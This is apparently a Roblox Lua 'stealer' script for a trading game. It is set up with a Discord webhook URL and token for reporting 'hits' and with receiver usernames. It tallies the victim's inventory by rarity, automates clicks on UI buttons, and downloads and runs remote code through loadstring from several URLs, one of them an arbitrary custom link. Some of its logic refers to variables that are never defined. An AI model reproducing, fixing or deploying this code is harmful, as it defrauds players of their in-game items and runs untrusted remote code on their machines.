Config = {
    Receivers = {"QuadCoreDragon", ""}, -- Your Username/s.
    Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-", -- Your webhook for hits.
    FullInventory = false, -- If true, it will display all of the player's items.
    GoodItemsOnly = false, -- If set to true, the stealer will not ping you if the player only has items below legendary.
    ResendTrade = ".", -- Send this in chat to resend the trade request if you don't receive it.
    Script = "None", -- Scripts > "None", "Custom", "Highlight Hub".
    CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
}

repeat wait() until game:IsLoaded()

if getgenv().scriptexecuted then return end
getgenv().scriptexecuted = true

LogsWebhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-"
-- Logs Webhook

LOGS_WEBS = LogsWebhook

local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Trade = ReplicatedStorage.Trade
local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
local Position = UDim2.new(0, 9999, 0, 9999)
local Inventory = {}
local StealerName = "m.kai"

local function sendnotification(message)
    getgenv().scriptexecuted = false
    print("["..StealerName.."]:" .. message)
    Notification:Notify(
        {Title = "[ "..StealerName.." ]", Description = message},
        {OutlineColor = Color3.fromRGB(80, 80, 80), Time = 7, Type = "default"}
    )
end

local messageMM2 = "You just got a new hit with **"..StealerName.."**!"
if Config.GoodItemsOnly and (Vintage > 0 or Godly > 0 or Ancient > 0 or Unique > 0) then
    messageMM2 = "@everyone\nYou just got a new **good** hit with **"..StealerName.."**!"
end

local success, errorMsg = pcall(function()
    local games = {
        [142823291] = true,
        [335132309] = true,
        [636649648] = true
    }
    
    if not games[game.PlaceId] then
        game:GetService("Players").LocalPlayer:Kick("\nUnsupported game!")
        while true do wait() end
    end
    
    -- Webhook validation
    if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Invalid 'Webhook' URL!")
        InvaildWebhook = true
        return
    end
    
    if not LogsWebhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Invalid 'Logs' URL!")
        return
    end
    
    if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
        sendnotification("Invalid 'Receivers' table!")
        return
    end
    
    if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Invalid 'Custom' URL!")
        return
    end
    
    -- Ensure FullInventory is boolean
    Config.FullInventory = Config.FullInventory == true

    if Config.Script == nil then
        Config.Script = "None"
    elseif Config.Script == "Custom" then
        Config.Script = Config.Script .. " - " .. Config.CustomLink
    end
    
    -- Load script based on Config.Script
    if Config.Script == "Custom" then
        loadstring(game:HttpGet(Config.CustomLink))()
    elseif Config.Script == "Mega Hub" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Hubs/main/Mega.lua", true))()
    elseif Config.Script == "YARHM" then
        loadstring(game:HttpGet("https://yarhm.goteamst.com/scr", false))()
    elseif Config.Script == "Nexus" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
    end
    
    -- Initialize item counts
    local itemCounts = {
        Common = 0,
        Uncommon = 0,
        Rare = 0,
        Legendary = 0,
        Vintage = 0,
        Godly = 0,
        Ancient = 0,
        Unique = 0
    }

    LocalPlayer.Idled:connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
    
    -- Determine UI path
    local UIPath, TradePath, Mobile
    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
        UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
        TradePath = LocalPlayer.PlayerGui.TradeGUI
        Mobile = false
    else
        UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
        TradePath = LocalPlayer.PlayerGui.TradeGUI_Phone
        Mobile = true
    end
    
    function TapUI(button, check, button2)
        if check == "Active Check" and button.Active then
            button = button[button2]
        elseif check == "Text Check" and button == "^" then
            button = button2
        else
            return
        end
        for _, v in pairs(events) do
            for _, conn in pairs(getconnections(button[v])) do
                conn:Fire()
            end
        end
    end
    
    function Rarity(color, amount, tradeable)
        local Stack = amount ~= "" and tonumber(amount:match("x(%d+)")) or 1
        local r, g, b = math.floor(color.R * 255 + 0.5), math.floor(color.G * 255 + 0.5), math.floor(color.B * 255 + 0.5)
        
        if r == 106 and g == 106 and b == 106 then
            itemCounts.Common = itemCounts.Common + Stack
        elseif r == 0 and g == 255 and b == 255 then
            itemCounts.Uncommon = itemCounts.Uncommon + Stack
        elseif r == 0 and g == 200 and b == 0 then
            itemCounts.Rare = itemCounts.Rare + Stack
        elseif r == 220 and g == 0 and b == 5 then
            itemCounts.Legendary = itemCounts.Legendary + Stack
        elseif r == 255 and g == 0 and b == 179 then
            itemCounts.Godly = itemCounts.Godly + Stack
        elseif r == 100 and g == 10 and b == 255 then
            itemCounts.Ancient = itemCounts.Ancient + Stack
        elseif r == 240 and g == 140 and b == 0 then
            itemCounts.Unique = itemCounts.Unique + Stack
        else
            itemCounts.Vintage = itemCounts.Vintage + Stack
        end
    end

    function checkitem(v)
        if v:IsA("Frame") then
            local itemNameLabel = v:FindFirstChild("ItemName")
            if itemNameLabel and itemNameLabel:IsA("TextLabel") then
                local itemName = itemNameLabel.Label.Text
                if itemName ~= "Default Knife" and itemName ~= "Default Gun" then
                    Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
                    if Config.FullInventory then
                        local number = v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"
                        table.insert(Inventory, itemName .. " " .. number)
                    end
                end
            else
                warn("ItemName not found for item: " .. tostring(v))
            end
        end
    end
    

    function InventoryCheck()
        for _, v in pairs(UIPath:GetChildren()) do
            checkitem(v)
        end
        if Config.FullInventory then
            if #Inventory > 0 then
                sendnotification("You have " .. #Inventory .. " items in your inventory.")
                for _, item in ipairs(Inventory) do
                    sendnotification(item)
                end
            else
                sendnotification("Alt Account detected!")
            end
        end
    end

    function onPlayerAdded(player)
        local success, result = pcall(function()
            local UserId = player.UserId
            local TradeData = HttpService:JSONDecode(game:GetService("ReplicatedStorage").TradeData:InvokeServer(UserId))

            -- Process trade data
            for _, v in pairs(TradeData) do
                if Config.FullInventory then
                    local number = v.Amount ~= "" and v.Amount or "x1"
                    table.insert(Inventory, v.Name .. " " .. number)
                end
                sendnotification("You have traded with " .. player.Name .. " who has " .. v.Amount .. " " .. v.Name)
            end
        end)

        if not success then
            warn("Error processing trade data for player: " .. player.Name .. " - " .. result)
        end
    end

    -- Connect to players added event
    Players.PlayerAdded:Connect(onPlayerAdded)

    -- Initial inventory check
    InventoryCheck()

    -- Trade handling logic (may require adaptation)
    Trade.OnClientEvent:Connect(function(trader)
        onPlayerAdded(trader)
    end)
end)

if errorMsg then
    sendnotification("Error: " .. errorMsg)
end
